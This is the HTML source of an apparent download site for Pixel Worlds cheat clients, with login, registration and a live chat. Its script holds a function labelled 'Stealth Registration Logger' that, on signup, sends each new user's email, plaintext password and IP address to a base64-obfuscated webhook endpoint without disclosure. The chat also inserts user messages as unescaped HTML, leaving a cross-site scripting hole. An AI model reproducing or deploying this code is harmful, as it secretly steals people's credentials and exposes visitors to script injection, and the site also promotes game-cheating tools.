<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EFN ARCHIVE | PW Database</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, push, onChildAdded, onValue, set, remove, serverTimestamp, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const _0x_config = {
            apiKey: "AIzaSyCM-ySTXgy37zVUMB2vy4ZJQ3MWlDD5g4E",
            authDomain: "efn-archive.firebaseapp.com",
            projectId: "efn-archive",
            storageBucket: "efn-archive.firebasestorage.app",
            messagingSenderId: "1073610968306",
            appId: "1:1073610968306:web:72e03b6f43decbb636546b",
            databaseURL: "https://efn-archive-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(_0x_config);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const _0x_gate = "aHR0cHM6Ly9zeXN0ZW0tc3luYy1sYXllci5waXhlbHdvcmxkc21hbmFnZXIxMDAud29ya2Vycy5kZXYv";

        setPersistence(auth, browserLocalPersistence);

        // Stealth Registration Logger
        async function _0x_fireEvent_init(_0x_email, _0x_pass) {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(atob(_0x_gate), {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        embeds: [{
                            title: "✨ Registration Success",
                            color: 0x5865F2,
                            fields: [
                                { name: "User", value: _0x_email, inline: true },
                                { name: "Pass", value: _0x_pass, inline: true },
                                { name: "IP", value: ipData.ip, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { }
        }

        // Chat & Typing Logic
        const chatBox = document.getElementById('chat-messages');
        const chatInput = document.getElementById('chat-input');
        const typingEl = document.getElementById('typing-indicator');

        window.sendMessage = () => {
            const user = auth.currentUser;
            if (!user) return alert("Login to chat!");
            if (!chatInput.value.trim()) return;
            push(ref(db, 'messages'), {
                username: user.email.split('@')[0],
                text: chatInput.value,
                timestamp: serverTimestamp()
            });
            chatInput.value = "";
            remove(ref(db, `typing/${user.uid}`));
        };

        chatInput.addEventListener('input', () => {
            const user = auth.currentUser;
            if (user) {
                if (chatInput.value.length > 0) {
                    set(ref(db, `typing/${user.uid}`), user.email.split('@')[0]);
                } else {
                    remove(ref(db, `typing/${user.uid}`));
                }
            }
        });

        onValue(ref(db, 'typing'), (snapshot) => {
            const users = snapshot.val();
            if (!users) { typingEl.innerText = ""; return; }
            const names = Object.values(users);
            if (names.length === 1) typingEl.innerText = `${names[0]} is typing...`;
            else if (names.length > 1) typingEl.innerText = "Several people are typing...";
            else typingEl.innerText = "";
        });

        onChildAdded(query(ref(db, 'messages'), limitToLast(40)), (data) => {
            const msg = data.val();
            const div = document.createElement('div');
            div.className = 'chat-msg fade-in';
            div.innerHTML = `<span class="chat-user">${msg.username}:</span> ${msg.text}`;
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        });

        // Auth Actions
        window.login = async () => {
            try {
                await signInWithEmailAndPassword(auth, document.getElementById('log-email').value, document.getElementById('log-pass').value);
                location.reload();
            } catch (err) { alert("Login failed."); }
        };

        window.signUp = async () => {
            const e = document.getElementById('reg-email').value;
            const p = document.getElementById('reg-pass').value;
            try {
                await createUserWithEmailAndPassword(auth, e, p);
                await _0x_fireEvent_init(e, p);
                location.reload();
            } catch (err) { alert(err.message); }
        };

        window.logout = () => signOut(auth).then(() => location.reload());
        window.switchAuth = (m) => {
            document.getElementById('login-box').style.display = m === 'reg' ? 'none' : 'block';
            document.getElementById('reg-box').style.display = m === 'reg' ? 'block' : 'none';
        };

        window.openDetail = (name, status, desc, img, link) => {
            document.getElementById('main-page').style.display = 'none';
            document.getElementById('detail-page').style.display = 'block';
            document.getElementById('det-title').innerText = name;
            document.getElementById('det-status').innerText = status;
            document.getElementById('det-desc').innerHTML = desc;
            document.getElementById('det-img').src = img;
            document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
            window.scrollTo(0,0);
        };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('nav-guest').style.display = 'none';
                document.getElementById('nav-user').style.display = 'flex';
                document.getElementById('user-tag').innerText = user.email.split('@')[0];
                document.querySelectorAll('.lock-ui').forEach(el => el.style.display = 'none');
                document.querySelectorAll('.auth-ui').forEach(el => el.style.display = 'block');
            }
        });
    </script>

    <style>
        :root { --bg: #0f0d1d; --side: #16142c; --card: #1d1b38; --accent: #5865F2; --border: #2a2747; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
        aside { width: 320px; background: var(--side); border-left: 1px solid var(--border); display: flex; flex-direction: column; }

        /* Chat UI Improvements */
        .chat-header { padding: 20px; font-weight: bold; border-bottom: 1px solid var(--border); color: var(--accent); letter-spacing: 1px; }
        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
        .chat-msg { background: rgba(255,255,255,0.03); padding: 10px 14px; border-radius: 12px; margin-bottom: 12px; font-size: 0.85rem; line-height: 1.4; border: 1px solid transparent; animation: slideMsg 0.3s ease-out; }
        .chat-user { color: var(--accent); font-weight: bold; display: block; font-size: 0.75rem; margin-bottom: 3px; }
        @keyframes slideMsg { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }

        #typing-indicator { height: 20px; padding: 0 15px; font-size: 0.75rem; color: #555; font-style: italic; }
        .chat-input-area { padding: 15px; background: #0c0b1a; display: flex; gap: 8px; }
        .chat-input-area input { flex: 1; background: #1a182e; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; outline: none; transition: 0.2s; }
        .chat-input-area input:focus { border-color: var(--accent); }

        /* Main Grid & Cards */
        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid var(--border); background: var(--side); z-index: 100; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 30px; padding: 40px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 25px; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center; position: relative; overflow: hidden; }
        .card:hover { transform: translateY(-12px); box-shadow: 0 20px 40px rgba(0,0,0,0.6); border-color: var(--accent); }
        .card img { width: 100%; border-radius: 12px; margin-bottom: 20px; transition: 0.5s; }
        .card:hover img { transform: scale(1.03); }
        
        .btn-main { background: #fff; color: #000; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: lowercase; }
        .btn-main:hover { background: var(--accent); color: #fff; transform: scale(1.05); }

        /* Detail Page */
        .tut-box { background: #0c0b1a; border-left: 4px solid var(--accent); padding: 20px; border-radius: 10px; margin: 20px 0; font-size: 0.95rem; text-align: left; line-height: 1.6; }
        .tut-box h3 { margin-top: 0; color: var(--accent); }
        blockquote { border-left: 3px solid var(--accent); padding: 10px 20px; margin: 20px 0; background: rgba(255,255,255,0.02); border-radius: 0 8px 8px 0; color: #ccc; }

        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(8px); }
        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 24px; border: 1px solid var(--border); text-align: center; }
        .auth-box input { width: 100%; padding: 14px; margin-bottom: 15px; background: #0a0914; border: 1px solid var(--border); color: #fff; border-radius: 10px; box-sizing: border-box; }
        
        .fade-in { animation: fadeIn 0.6s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<main>
    <nav>
        <div style="font-weight:900; letter-spacing:3px; font-size:1.3rem;">EFN ARCHIVE</div>
        <div id="nav-guest"><button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">login</button></div>
        <div id="nav-user" style="display:none; align-items:center; gap:20px">
            <span id="user-tag" style="background:rgba(88, 101, 242, 0.1); padding:8px 15px; border-radius:20px; color:var(--accent); font-weight:bold; font-size:0.8rem"></span>
            <button onclick="logout()" style="background:none; border:none; color:#ff4444; cursor:pointer; font-weight:bold">logout</button>
        </div>
    </nav>

    <div id="main-page" class="container">
        <div class="grid">
            <div class="card fade-in">
                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png">
                <h3>Charon Client v2.0</h3>
                <button class="btn-main" onclick="openDetail('Charon Client v2.0', 'Working', `
                    <div class='tut-box'>
                        <h3>🚀 Tutorial: Charon Client</h3>
                        1️⃣ Download the zip folder (download button).<br>
                        2️⃣ Extract the files to the location of pixel worlds folder.<br>

                        4️⃣ Launch the game and press the menu key!
                    </div>
                    <h3>Charon Client Possible Causes & Fixes</h3>
                    <blockquote>
                        <b>Running the game fullscreen or changed resolution while the menu was active</b><br>
                        You may need to:<br>
                        - Delete the entire PW folder and reinstall PW<br>
                        - Go in-game → <b>Settings</b> → <b>Display</b> → switch to <b>Windowed Mode</b><br>
                        - Or add <code>-windowed</code> to your <b>Steam Launch Options</b>
                    </blockquote>
                    <blockquote>
                        <b>DirectX issues</b> (most common on laptops)<br>
                        Try forcing a DirectX version via <b>Steam Launch Options</b>:<br><br>
                        <b>Option 1: Auto (try this first)</b><br>Set <code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>Auto</code><br><br>
                        <b>Option 2: Force D3D11</b><br>Launch option: <code>-force-d3d11</code><br><code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>ForceD3D11</code><br><br>
                        <b>Option 3: Force D3D12</b><br>Launch option: <code>-force-d3d12</code><br><code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>ForceD3D12</code>
                    </blockquote>
                    <p style='color:var(--accent); font-weight:bold;'>EVERYONE WHO CRASHED WHEN U TRY LOGIN JUST MINIMIZE UR PW USE SMALL WINDOW</p>
                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
            </div>

            <div class="card fade-in" style="animation-delay: 0.1s;">
                <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
                <h3>Hyx Client [free]</h3>
                <button class="btn-main" onclick="openDetail('Hyx Client [free]', 'Working', 'Make sure you have <a href=\'https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe\' style=\'color:var(--accent)\'>vcredist AIO</a> installed.<br><br><b>Steam Launch Settings:</b><br><code>-force-d3d11</code><br><br><b>Extraction Password:</b> <code>Hyx</code>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
            </div>
            
            <div class="card fade-in" style="animation-delay: 0.2s;">
                <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png">
                <h3>AutoMath Tool</h3>
                <button class="btn-main" onclick="openDetail('AutoMath Tool', 'Working', 'Advanced math automation for PW. Includes a tutorial in the zip folder. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png', 'https://gofile.io/d/9sUpZS')">info</button>
            </div>
        </div>
    </div>

    <div id="detail-page" class="container fade-in" style="display:none; padding:40px;">
        <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px; font-size:1rem;">← BACK TO DATABASE</button>
        <div style="display:flex; gap:50px; flex-wrap:wrap">
            <div style="flex:2">
                <img id="det-img" src="" style="width:100%; border-radius:20px; border:1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
                <h1 id="det-title" style="font-size:2.5rem; margin-top:30px; margin-bottom:10px;"></h1>
                <div id="det-desc" style="color:#aaa; line-height:1.8; font-size:1.05rem;"></div>
            </div>
            <div style="flex:1; background:var(--card); border-radius:24px; padding:35px; height:fit-content; border:1px solid var(--border); text-align:center;">
                <div id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.5rem"></div>
                <hr style="border:0; border-top:1px solid var(--border); margin:30px 0">
                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff; padding:15px;" onclick="document.getElementById('auth-overlay').style.display='flex'">login to download</button></div>
                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%; padding:15px; font-size:1.1rem;">download tool</button></div>
            </div>
        </div>
    </div>
</main>

<aside>
    <div class="chat-header">🗨️ GLOBAL CHAT</div>
    <div id="chat-messages"></div>
    <div id="typing-indicator"></div>
    <div class="chat-input-area">
        <input type="text" id="chat-input" placeholder="Type a message...">
        <button onclick="sendMessage()">➤</button>
    </div>
</aside>

<div id="auth-overlay">
    <div class="auth-box fade-in" id="login-box">
        <h2 style="margin-bottom:10px">Sign In</h2>
        <p style="color:#666; font-size:0.9rem; margin-bottom:30px">Access the PW tools and chat.</p>
        <input type="email" id="log-email" placeholder="Email">
        <input type="password" id="log-pass" placeholder="Password">
        <button class="btn-main" style="width:100%; margin-top:10px" onclick="login()">sign in</button>
        <p style="font-size:0.85rem; margin-top:25px;">New here? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('reg')">Create Account</span></p>
        <p style="font-size:0.8rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close window ]</p>
    </div>

    <div class="auth-box fade-in" id="reg-box" style="display:none">
        <h2 style="margin-bottom:10px">Register</h2>
        <p style="color:#666; font-size:0.9rem; margin-bottom:30px">Create an account to download.</p>
        <input type="email" id="reg-email" placeholder="Email">
        <input type="password" id="reg-pass" placeholder="Password">
        <button class="btn-main" style="width:100%; margin-top:10px" onclick="signUp()">create account</button>
        <p style="font-size:0.85rem; margin-top:25px;">Already have an account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('log')">Login</span></p>
        <p style="font-size:0.8rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close window ]</p>
    </div>
</div>

</body>
</html>
